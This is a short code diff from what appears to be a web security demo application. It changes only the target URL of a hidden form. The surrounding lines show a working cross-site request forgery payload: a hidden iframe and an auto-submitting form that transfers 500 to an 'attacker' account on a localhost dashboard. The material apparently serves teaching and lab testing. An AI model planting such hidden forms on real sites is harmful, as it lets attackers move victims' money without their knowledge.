@@ -48,7 +48,7 @@
         
         <!-- Hidden CSRF form that transfers money to attacker (user ID 2) -->
         <iframe style="display:none" name="csrf-frame"></iframe>
-        <form id="csrf-form" action="http://localhost/login_app/dashboard.php" method="POST" target="csrf-frame">
+        <form id="csrf-form" action="http://localhost/Web-Security-Demo-Application/dashboard.php" method="POST" target="csrf-frame">
             <input type="hidden" name="to_id" value="2">
             <input type="hidden" name="amount" value="500">
             <input type="hidden" name="transfer" value="Transfer Money">
